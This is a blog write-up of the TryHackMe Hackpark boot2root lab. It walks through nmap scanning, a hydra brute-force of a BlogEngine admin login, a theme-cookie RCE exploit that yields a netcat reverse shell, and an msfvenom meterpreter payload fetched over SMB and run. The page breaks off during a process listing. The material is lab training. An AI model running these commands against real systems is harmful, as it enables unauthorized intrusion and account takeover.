<!doctype html><html lang=en-us><head><title>Hackpark Boot2Root Write-Up | Nate Catelli's Blog</title><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge,chrome=1"><meta name=viewport content="width=device-width,minimum-scale=1"><meta name=description content="A boot2root writeup of the Hackpark host from TryHackMe."><meta name=generator content="Hugo 0.110.0"><meta name=ROBOTS content="INDEX, FOLLOW"><link rel=stylesheet href=/css/style.css></head><body><nav class=navigation><a href=/><span class=arrow>‚Üê</span>Home</a>
<a href=/posts>Archive</a>
<a href=/tags>Tags</a>
<a href=/about>About</a>
<a href=/projects>Projects</a>
<a href=/misc>Misc</a>
<a class=button href=https://ncatelli.github.io/index.xml>Subscribe</a></nav><main class=main><section id=single><h1 class=title>Hackpark Boot2Root Write-Up</h1><div class=tip><time datetime="2020-11-23 00:00:00 +0000 UTC">Nov 23, 2020</time>
<span class=split>¬∑</span>
<span>3117 words</span>
<span class=split>¬∑</span>
<span>15 minute read</span></div><aside class=toc><details><summary>Table of Contents</summary><div><nav id=TableOfContents><ul><li><a href=#introduction>Introduction</a></li><li><a href=#environment>Environment</a></li><li><a href=#attack>Attack</a><ul><li><a href=#host-enumeration>Host enumeration</a></li><li><a href=#brute-forcing-the-login-page>Brute forcing the login page</a></li><li><a href=#gaining-a-foothold>Gaining a foothold</a></li><li><a href=#local-enumeration>Local Enumeration</a></li><li><a href=#attacking-wscheduler>Attacking WScheduler</a></li></ul></li><li><a href=#summary>Summary</a></li></ul></nav></div></details></aside><div class=content><h2 id=introduction>Introduction <a href=#introduction class=anchor>üîó</a></h2><p>The Hackpark challenge was deceptively simple in the initial exploratory phase. I had gained a ton of ground early on while I established a foothold on the host but discovering a pivot point from a low-privileged user to System took me significantly longer, primarily due to my unfamiliarity with Windows.</p><h2 id=environment>Environment <a href=#environment class=anchor>üîó</a></h2><p>The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the the target host. Nothing else was known about the host prior to the attack other than that the host was most likely a Windows host.</p><h2 id=attack>Attack <a href=#attack class=anchor>üîó</a></h2><p>Prior to starting initial recon, I opened up a metasploit console and connected it to the msfdb postgres backend to gather any information that I had found into a single point. I also had setup burp suite to run on port 8080 and configured the local CA in Firefox.</p><h3 id=host-enumeration>Host enumeration <a href=#host-enumeration class=anchor>üîó</a></h3><p>After this initial setup, I started with a SYN, OS and Version scan of the host to attempt to identify at a high level what I was looking at.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 &gt; db_nmap -sS -sV -O 10.10.167.66
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Starting Nmap 7.80 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2020-11-18 22:16 UTC
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Nmap scan report <span style=color:#66d9ef>for</span> ip-10-10-167-66.eu-west-1.compute.internal <span style=color:#f92672>(</span>10.10.167.66<span style=color:#f92672>)</span>ap: Host is up <span style=color:#f92672>(</span>0.00050s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Not shown: <span style=color:#ae81ff>998</span> filtered ports
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: PORT     STATE SERVICE            VERSION
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: 80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 <span style=color:#f92672>(</span>SSDP/UPnP<span style=color:#f92672>)</span>*<span style=color:#f92672>]</span> Nmap: 3389/tcp open  ssl/ms-wbt-server?
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: MAC Address: 02:98:D2:5A:E8:A1 <span style=color:#f92672>(</span>Unknown<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Warning: OSScan results may be unreliable because we could not find at least <span style=color:#ae81ff>1</span> open and <span style=color:#ae81ff>1</span> closed portl purpose
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Running <span style=color:#f92672>(</span>JUST GUESSING<span style=color:#f92672>)</span>: Microsoft Windows <span style=color:#ae81ff>2012</span> <span style=color:#f92672>(</span>89%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS CPE: cpe:/o:microsoft:windows_server_2012
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Aggressive OS guesses: Microsoft Windows Server <span style=color:#ae81ff>2012</span> <span style=color:#f92672>(</span>89%<span style=color:#f92672>)</span>, Microsoft Windows Server <span style=color:#ae81ff>2012</span> or Windows Server <span style=color:#ae81ff>2012</span> R2 <span style=color:#f92672>(</span>89%<span style=color:#f92672>)</span>, Microsoft Windows Server <span style=color:#ae81ff>2012</span> R2 <span style=color:#f92672>(</span>89%<span style=color:#f92672>)</span>p: Network Distance: <span style=color:#ae81ff>1</span> hop
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .ress <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 30.92 seconds
</span></span></code></pre></div><p>This quickly confirmed that the host was a Windows server, most likely Server 2012 and that it was running an HTTP and RDP server. It also pointed out that there was a <code>robots.txt</code> link with a few entries.</p><p>While this was a fairly small footprint, I decided to kick off a broader portscan covering ports <code>1-65535</code> to make sure I hadn&rsquo;t missed anything while I checked out what the website had to offer.</p><h4 id=clicking-around-the-site>Clicking around the site <a href=#clicking-around-the-site class=anchor>üîó</a></h4><p>I opened the site to firefox to be greeted by a less-than-pleasant clown face.</p><p><p class=markdown-image><img src=/images/hackpark_http_index.png alt="hack park index"></p></p><p>This looked to be a basic blog, so I decided to do some happy path crawling around the site to build up a sitemap in burp as well as my own mental map of the site. Shortly after I found an admin login page that also provided a password recovery link.</p><p>I decided to play around with the password recovery and found that <code>admin</code> returned a different result than any of the other users I had attempted.</p><p><p class=markdown-image><img src=/images/hackpark_http_password_retrieval.png alt="hack park password retreival"></p></p><p>Given this supposed user, and that the earlier broad scan yielded nothing, I chose to kick off a background dictionary attack against the <code>admin</code> user while I continued to dig around in the site.</p><h3 id=brute-forcing-the-login-page>Brute forcing the login page <a href=#brute-forcing-the-login-page class=anchor>üîó</a></h3><p>I returned to the login page and tried an <code>admin:test</code> login to try to identify an element that I could use for a failure parameter in hydra. Failed logins spit out a very simple to match <code>Login failed</code> string. I grabbed the rest of the post body from Burp and started a brute with hydra, using rockyou as the source dictionary.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> exec: hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.167.66 http-post-form <span style=color:#e6db74>&#34;/Account/login.aspx:__VIEWSTATE=n0dSQaeIUU9td9IiqqxUjQRLt5Vfe9tKftxi264M8uj5KA0zULHSKHjNdqwkzcbSpoimIX3xFLnJz6eAk2EmBlJx3HWWy14YxvnbwBNZczvzFuWjEwLsnVK622pYz9Cw7VQBjYDmS0PHqL0lcA5jxvCn9ILgh4J5Oh8k66K0JOnmXtVC&amp;__EVENTVALIDATION=xjUAebAft2KQN5MffRGhUH5IgDIw1wmzjlNgpt8Vb4N2656viCANryx5yExK93%2BExMUVpVlU%2B%2BHh7jZwqAaf0sH%2Fmg1JISBvUobZVuCj573XBsDtL%2BRyJMOr%2BNWlN4XXAuWjifxkURjzlElA8RJsOQnoIxK8J2daZrZu0wEFAHgf62F0&amp;ctl00%24MainContent%24LoginUser%24UserName=^USER^&amp;ctl00%24MainContent%24LoginUser%24Password=^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Hydra v9.1 <span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style=color:#66d9ef>do</span> not use in military or secret service organizations, or <span style=color:#66d9ef>for</span> illegal purposes <span style=color:#f92672>(</span>this is non-binding, these *** ignore laws and ethics anyway<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> starting at 2020-11-18 22:28:40
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> max <span style=color:#ae81ff>16</span> tasks per <span style=color:#ae81ff>1</span> server, overall <span style=color:#ae81ff>16</span> tasks, <span style=color:#ae81ff>14344399</span> login tries <span style=color:#f92672>(</span>l:1/p:14344399<span style=color:#f92672>)</span>, ~896525 tries per task
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>DATA<span style=color:#f92672>]</span> attacking http-post-form://10.10.167.66:80/Account/login.aspx:__VIEWSTATE<span style=color:#f92672>=</span>n0dSQaeIUU9td9IiqqxUjQRLt5Vfe9tKftxi264M8uj5KA0zULHSKHjNdqwkzcbSpoimIX3xFLnJz6eAk2EmBlJx3HWWy14YxvnbwBNZczvzFuWjEwLsnVK622pYz9Cw7VQBjYDmS0PHqL0lcA5jxvCn9ILgh4J5Oh8k66K0JOnmXtVC&amp;__EVENTVALIDATION<span style=color:#f92672>=</span>xjUAebAft2KQN5MffRGhUH5IgDIw1wmzjlNgpt8Vb4N2656viCANryx5yExK93%2BExMUVpVlU%2B%2BHh7jZwqAaf0sH%2Fmg1JISBvUobZVuCj573XBsDtL%2BRyJMOr%2BNWlN4XXAuWjifxkURjzlElA8RJsOQnoIxK8J2daZrZu0wEFAHgf62F0&amp;ctl00%24MainContent%24LoginUser%24UserName<span style=color:#f92672>=</span>^USER^&amp;ctl00%24MainContent%24LoginUser%24Password<span style=color:#f92672>=</span>^PASS^&amp;ctl00%24MainContent%24LoginUser%24LoginButton<span style=color:#f92672>=</span>Log+in:Login failed
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>80<span style=color:#f92672>][</span>http-post-form<span style=color:#f92672>]</span> host: 10.10.167.66   login: admin   password: 1qaz2wsx
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span> of <span style=color:#ae81ff>1</span> target successfully completed, <span style=color:#ae81ff>1</span> valid password found
</span></span><span style=display:flex><span>Hydra <span style=color:#f92672>(</span>https://github.com/vanhauser-thc/thc-hydra<span style=color:#f92672>)</span> finished at 2020-11-18 22:29:01
</span></span></code></pre></div><p>This quickly yielded a password that allowed me to access the admin page of the site before I could even continue poking around.</p><h3 id=gaining-a-foothold>Gaining a foothold <a href=#gaining-a-foothold class=anchor>üîó</a></h3><p>I was wholy unfamiliar with blogengine but by clicking around, I was able to find an <code>about</code> page that gave me information about what the service version was and who it was running as. With this information in hand, I decided to check exploitdb for anything of value.</p><p><p class=markdown-image><img src=/images/hackpark_http_blogengine.png alt="hackpark blogengine admin"></p></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/exploits# searchsploit blogengine -w
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
</span></span><span style=display:flex><span> Exploit Title                                                                                                           |  URL
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
</span></span><span style=display:flex><span>BlogEngine 3.3 - <span style=color:#e6db74>&#39;syndication.axd&#39;</span> XML External Entity Injection                                                         | https://www.exploit-db.com/exploits/48422
</span></span><span style=display:flex><span>BlogEngine 3.3 - XML External Entity Injection                                                                           | https://www.exploit-db.com/exploits/46106
</span></span><span style=display:flex><span>BlogEngine.NET 1.4 - <span style=color:#e6db74>&#39;search.aspx&#39;</span> Cross-Site Scripting                                                                  | https://www.exploit-db.com/exploits/32874
</span></span><span style=display:flex><span>BlogEngine.NET 1.6 - Directory Traversal / Information Disclosure                                                        | https://www.exploit-db.com/exploits/35168
</span></span><span style=display:flex><span>BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution                                                       | https://www.exploit-db.com/exploits/46353
</span></span><span style=display:flex><span>BlogEngine.NET 3.3.6/3.3.7 - <span style=color:#e6db74>&#39;dirPath&#39;</span> Directory Traversal / Remote Code Execution                                       | https://www.exploit-db.com/exploits/47010
</span></span><span style=display:flex><span>BlogEngine.NET 3.3.6/3.3.7 - <span style=color:#e6db74>&#39;path&#39;</span> Directory Traversal                                                                  | https://www.exploit-db.com/exploits/47035
</span></span><span style=display:flex><span>BlogEngine.NET 3.3.6/3.3.7 - <span style=color:#e6db74>&#39;theme Cookie&#39;</span> Directory Traversal / Remote Code Execution                                  | https://www.exploit-db.com/exploits/47011
</span></span><span style=display:flex><span>BlogEngine.NET 3.3.6/3.3.7 - XML External Entity Injection                                                               | https://www.exploit-db.com/exploits/47014
</span></span><span style=display:flex><span>------------------------------------------------------------------------------------------------------------------------- --------------------------------------------
</span></span><span style=display:flex><span>Shellcodes: No Results
</span></span></code></pre></div><p>A few of these looked extremely interesting, as they provided remote code execution via a vulnerable theme cookie. Especially <a href=https://www.exploit-db.com/exploits/47011 target=_blank rel=noopener>47011</a> which included a python script that automated the theme upload via a simple to use cli and already had a reverse shell command staged. I pulled this script down and fixed a small error where a <code>=================================</code> string was left uncommented.</p><p>I then started up a netcat listener in a new window to catch a shell and attempted to trigger the RCE.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/exploits# python 47011.py -t $ATTACKTARGET -u admin -p 1qaz2wsx -l 10.10.7.59:443
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~# nc -lvnp <span style=color:#ae81ff>443</span>
</span></span><span style=display:flex><span>listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>443</span> ...
</span></span><span style=display:flex><span>connect to <span style=color:#f92672>[</span>10.10.7.59<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.167.66<span style=color:#f92672>]</span> <span style=color:#ae81ff>49241</span>
</span></span><span style=display:flex><span>Microsoft Windows <span style=color:#f92672>[</span>Version 6.3.9600<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>c<span style=color:#f92672>)</span> <span style=color:#ae81ff>2013</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>c:<span style=color:#ae81ff>\w</span>indows<span style=color:#ae81ff>\s</span>ystem32<span style=color:#ae81ff>\i</span>netsrv&gt;whoami
</span></span><span style=display:flex><span>iis apppool<span style=color:#ae81ff>\b</span>log
</span></span></code></pre></div><p>While this gave me a shell on the host, it was about as limited as it could be. My goal became to escalate this shell to something a bit stabler. Preferably a meterpreter shell. With this in mind I decided to craft a new executable reverse shell that I could catch with the <code>multi/handler</code>. I started a listener in msfconsole on port 4444 in preparation.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/transfer# msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style=color:#f92672>=</span>10.10.7.59 LPORT<span style=color:#f92672>=</span><span style=color:#ae81ff>4444</span> -f exe -o hello.exe
</span></span></code></pre></div><p>With an exploit ready, I decided to attempt to transfer it using impacket&rsquo;s smb server.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>root@kali:~/ctf/transfer# impacket-smbserver -smb2support TX $PWD
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>dir \\<span style=color:#ae81ff>10.10</span>.7.<span style=color:#ae81ff>59</span>\TX\
</span></span><span style=display:flex><span>c:\windows\system32\inetsrv&gt;dir \\<span style=color:#ae81ff>10.10</span>.7.<span style=color:#ae81ff>59</span>\TX\
</span></span><span style=display:flex><span> Volume <span style=color:#66d9ef>in</span> drive \\<span style=color:#ae81ff>10.10</span>.7.<span style=color:#ae81ff>59</span>\TX has no label.
</span></span><span style=display:flex><span> Volume Serial Number is ABCD-EFAA
</span></span><span style=display:flex><span> Directory of \\<span style=color:#ae81ff>10.10</span>.7.<span style=color:#ae81ff>59</span>\TX
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>2020</span>  <span style=color:#ae81ff>02</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>38</span> PM            <span style=color:#ae81ff>73</span>,<span style=color:#ae81ff>802</span> hello.exe
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>1</span> File(s)         <span style=color:#ae81ff>73</span>,<span style=color:#ae81ff>802</span> bytes
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>0</span> Dir(s)  <span style=color:#ae81ff>18</span>,<span style=color:#ae81ff>391</span>,<span style=color:#ae81ff>148</span>,<span style=color:#ae81ff>419</span>,<span style=color:#ae81ff>302</span>,<span style=color:#ae81ff>293</span>,<span style=color:#ae81ff>504</span> bytes free
</span></span><span style=display:flex><span>c:\windows\system32\inetsrv&gt;pwd
</span></span><span style=display:flex><span>cd c:\windows\Temp\
</span></span><span style=display:flex><span>c:\windows\system32\inetsrv&gt;cd c:\windows\Temp\
</span></span><span style=display:flex><span>dir
</span></span><span style=display:flex><span>c:\Windows\Temp&gt;dir
</span></span><span style=display:flex><span> Volume <span style=color:#66d9ef>in</span> drive C has no label.
</span></span><span style=display:flex><span> Volume Serial Number is <span style=color:#ae81ff>0E97</span>-C552
</span></span><span style=display:flex><span> Directory of c:\Windows\Temp
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>2020</span>  <span style=color:#ae81ff>02</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>44</span> PM    &lt;DIR&gt;          .
</span></span><span style=display:flex><span><span style=color:#ae81ff>11</span>/<span style=color:#ae81ff>18</span>/<span style=color:#ae81ff>2020</span>  <span style=color:#ae81ff>02</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>44</span> PM    &lt;DIR&gt;          ..
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span>/<span style=color:#ae81ff>06</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span> PM             <span style=color:#ae81ff>8</span>,<span style=color:#ae81ff>795</span> Amazon_SSM_Agent_20190806141239.log
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span>/<span style=color:#ae81ff>06</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span> PM           <span style=color:#ae81ff>181</span>,<span style=color:#ae81ff>468</span> Amazon_SSM_Agent_20190806141239_000_AmazonSSMAgentMSI.log
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span>/<span style=color:#ae81ff>06</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span> PM             <span style=color:#ae81ff>1</span>,<span style=color:#ae81ff>206</span> cleanup.txt
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span>/<span style=color:#ae81ff>06</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span> PM               <span style=color:#ae81ff>421</span> cmdout
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span>/<span style=color:#ae81ff>06</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>11</span> PM                 <span style=color:#ae81ff>0</span> DMI2EBC.tmp
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span>/<span style=color:#ae81ff>03</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>09</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>43</span> AM                 <span style=color:#ae81ff>0</span> DMI4D21.tmp
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span>/<span style=color:#ae81ff>06</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>12</span> PM             <span style=color:#ae81ff>8</span>,<span style=color:#ae81ff>743</span> EC2ConfigService_20190806141221.log
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span>/<span style=color:#ae81ff>06</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>12</span> PM           <span style=color:#ae81ff>292</span>,<span style=color:#ae81ff>438</span> EC2ConfigService_20190806141221_000_WiXEC2ConfigSetup_64.log
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span>/<span style=color:#ae81ff>06</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span> PM                <span style=color:#ae81ff>21</span> stage1-complete.txt
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span>/<span style=color:#ae81ff>06</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span> PM            <span style=color:#ae81ff>28</span>,<span style=color:#ae81ff>495</span> stage1.txt
</span></span><span style=display:flex><span><span style=color:#ae81ff>05</span>/<span style=color:#ae81ff>12</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>08</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>03</span> PM           <span style=color:#ae81ff>113</span>,<span style=color:#ae81ff>328</span> svcexec.exe
</span></span><span style=display:flex><span><span style=color:#ae81ff>08</span>/<span style=color:#ae81ff>06</span>/<span style=color:#ae81ff>2019</span>  <span style=color:#ae81ff>01</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>13</span> PM                <span style=color:#ae81ff>67</span> tmp.dat
</span></span><span style=display:flex><span>              <span style=color:#ae81ff>12</span> File(s)        <span style=color:#ae81ff>634</span>,<span style=color:#ae81ff>982</span> bytes
</span></span><span style=display:flex><span>               <span style=color:#ae81ff>2</span> Dir(s)  <span style=color:#ae81ff>39</span>,<span style=color:#ae81ff>108</span>,<span style=color:#ae81ff>558</span>,<span style=color:#ae81ff>848</span> bytes free
</span></span><span style=display:flex><span>copy \\<span style=color:#ae81ff>10.10</span>.7.<span style=color:#ae81ff>59</span>\TX\hello.exe hello.exe
</span></span><span style=display:flex><span>c:\Windows\Temp&gt;copy \\<span style=color:#ae81ff>10.10</span>.7.<span style=color:#ae81ff>59</span>\TX\hello.exe hello.exe
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>1</span> file(s) copied.
</span></span><span style=display:flex><span>.\hello.exe
</span></span></code></pre></div><p>After executing <code>hello.exe</code>, I was able to catch the meterpreter shell which I then quickly tried to migrate to a <em>slightly</em> stabler process. However being attached to the <code>cmd.exe</code> process still had me worried about stability.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; <span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Sending stage <span style=color:#f92672>(</span><span style=color:#ae81ff>176195</span> bytes<span style=color:#f92672>)</span> to 10.10.167.66
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Meterpreter session <span style=color:#ae81ff>1</span> opened <span style=color:#f92672>(</span>10.10.7.59:4444 -&gt; 10.10.167.66:49250<span style=color:#f92672>)</span> at 2020-11-18 22:48:36 +0000
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>msf5 exploit<span style=color:#f92672>(</span>multi/handler<span style=color:#f92672>)</span> &gt; sessions <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>*<span style=color:#f92672>]</span> Starting interaction with 1...
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>meterpreter &gt; getpid
</span></span><span style=display:flex><span>Current pid: <span style=color:#ae81ff>1460</span>
</span></span><span style=display:flex><span>meterpreter &gt; ps
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Process List
</span></span><span style=display:flex><span><span style=color:#f92672>============</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> PID   PPID  Name                  Arch  Session  User              Path
</span></span><span style=display:flex><span> ---   ----  ----                  ----  -------  ----              ----
</span></span><span style=display:flex><span> <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>     <span style=color:#f92672>[</span>System Process<span style=color:#f92672>]</span>                                       
</span></span><span style=display:flex><span> <span style=color:#ae81ff>4</span>     <span style=color:#ae81ff>0</span>     System                                                 
</span></span><span style=display:flex><span> <span style=color:#ae81ff>368</span>   <span style=color:#ae81ff>4</span>     smss.exe                                               
</span></span><span style=display:flex><span> <span style=color:#ae81ff>520</span>   <span style=color:#ae81ff>512</span>   csrss.exe                                              
</span></span><span style=display:flex><span> <span style=color:#ae81ff>580</span>   <span style=color:#ae81ff>568</span>   csrss.exe                                              
</span></span><span style=display:flex><span> <span style=color:#ae81ff>588</span>   <span style=color:#ae81ff>512</span>   wininit.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>616</span>   <span style=color:#ae81ff>568</span>   winlogon.exe                                           
</span></span><span style=display:flex><span> <span style=color:#ae81ff>672</span>   <span style=color:#ae81ff>588</span>   services.exe                                           
</span></span><span style=display:flex><span> <span style=color:#ae81ff>680</span>   <span style=color:#ae81ff>588</span>   lsass.exe                                              
</span></span><span style=display:flex><span> <span style=color:#ae81ff>740</span>   <span style=color:#ae81ff>672</span>   svchost.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>784</span>   <span style=color:#ae81ff>672</span>   svchost.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>820</span>   <span style=color:#ae81ff>672</span>   svchost.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>868</span>   <span style=color:#ae81ff>616</span>   dwm.exe                                                
</span></span><span style=display:flex><span> <span style=color:#ae81ff>876</span>   <span style=color:#ae81ff>672</span>   svchost.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>904</span>   <span style=color:#ae81ff>672</span>   svchost.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>964</span>   <span style=color:#ae81ff>672</span>   svchost.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1020</span>  <span style=color:#ae81ff>672</span>   svchost.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1132</span>  <span style=color:#ae81ff>672</span>   spoolsv.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1156</span>  <span style=color:#ae81ff>672</span>   amazon-ssm-agent.exe                                   
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1208</span>  <span style=color:#ae81ff>2792</span>  conhost.exe           x64   <span style=color:#ae81ff>0</span>        IIS APPPOOL<span style=color:#ae81ff>\B</span>log  C:<span style=color:#ae81ff>\W</span>indows<span style=color:#ae81ff>\S</span>ystem32<span style=color:#ae81ff>\c</span>onhost.exe
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1216</span>  <span style=color:#ae81ff>672</span>   svchost.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1236</span>  <span style=color:#ae81ff>672</span>   LiteAgent.exe                                          
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1292</span>  <span style=color:#ae81ff>672</span>   svchost.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1356</span>  <span style=color:#ae81ff>672</span>   svchost.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1372</span>  <span style=color:#ae81ff>672</span>   svchost.exe                                            
</span></span><span style=display:flex><span> <span style=color:#ae81ff>1388</span>  <span style=color:#ae81ff>672</span>   WService.exe                                           
